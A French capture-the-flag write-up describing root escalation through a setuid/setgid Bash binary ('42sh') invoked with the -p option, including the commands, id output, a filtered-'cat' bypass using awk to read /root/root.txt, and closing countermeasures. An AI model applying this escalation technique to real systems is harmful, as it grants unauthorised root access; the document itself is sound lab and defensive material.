---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-269 et CWE-250
---

# Documentation : H4ck3rz (Root Flag)
# Documentation : H4ck3rz (Root Flag)

## 1. Contexte & Objectif

> Prove that you are a h4ck3rz by hacking this 42sh!

* **Cible** : `10.10.0.50`
* **Objectif** : Exploiter le binaire `42sh` et récupérer le fichier `root.txt`.

Le début du challenge est identique à celui de la première partie : l'accès est obtenu avec l'utilisateur `www-data`, puis une commande `sudo` permet de passer à l'utilisateur `titouan`.

---

## 2. Découverte du binaire `42sh`

Le répertoire personnel de `titouan` contient un binaire avec des permissions particulières :

```text
-rwsrwsrwt 1 root root 1298416 ... 42sh
```

Une analyse avec `stat` confirme les informations suivantes :

```text
Access: (7777/-rwsrwsrwt)
Uid: (0/root)
Gid: (0/root)
```

Le fichier possède donc les permissions `07777` et appartient à `root:root`.

Le `s` au niveau du propriétaire correspond au bit **setuid**. Celui présent au niveau du groupe correspond au bit **setgid**.

---

## 3. Analyse du comportement de `42sh`

L'analyse du binaire montre que `42sh` est en réalité :

```text
GNU bash, version 5.2.37
```

Les commandes Bash classiques sont donc disponibles.

Sans option particulière, la commande suivante est exécutée :

```bash
sudo -u titouan /home/titouan/42sh -c 'id'
```

Résultat :

```text
uid=1000(titouan) gid=1000(titouan)
```

Le lancement classique ne conserve donc pas les privilèges root.

---

## 4. Découverte du mode privilégié de Bash

Le point décisif est l'utilisation de l'option `-p` de Bash :

```bash
sudo -u titouan /home/titouan/42sh -p -c 'id'
```

Résultat :

```text
uid=1000(titouan) gid=1000(titouan) euid=0(root) egid=0(root)
groups=0(root),1000(titouan)
```

### Pourquoi est-ce important ?

Le processus possède désormais les valeurs suivantes :

```text
UID  = 1000
EUID = 0
```

Le **UID réel** reste celui de `titouan`, mais le **UID effectif** est celui de `root`. Le processus dispose donc des privilèges effectifs de root.

Comparaison :

| Mode | UID réel | UID effectif |
| --- | ---: | ---: |
| Sans `-p` | 1000 (`titouan`) | 1000 (`titouan`) |
| Avec `-p` | 1000 (`titouan`) | 0 (`root`) |

Ce mécanisme constitue le point central de l'exploitation.

---

## 5. Lecture de `root.txt`

Le mot-clé `cat` étant filtré par le shell panel, une autre commande Unix est utilisée pour afficher le fichier protégé.

La commande utilisée est :

```bash
sudo -u titouan /home/titouan/42sh -p -c 'awk ... /root/root.txt'
```

Grâce au mode privilégié de Bash, cette commande permet de récupérer le contenu de `root.txt`.

---

## 6. Chaîne d'exploitation complète

```text
www-data
   |
   | sudo
   v
titouan
   |
   | /home/titouan/42sh
   |
   | -p
   v
EUID = root
   |
   v
Accès aux fichiers root
   |
   v
/root/root.txt
```

## 7. Contre-mesures

### Binaire Bash setuid/setgid

- Ne jamais installer Bash ou un shell généraliste avec le bit setuid/setgid.
- Retirer les permissions dangereuses `07777` et vérifier les fichiers privilégiés avec `find / -perm /6000`.
- Remplacer le binaire par un programme dédié, sans interprétation de commandes ni option de shell privilégié.
- Appliquer le moindre privilège et contrôler les permissions après chaque déploiement.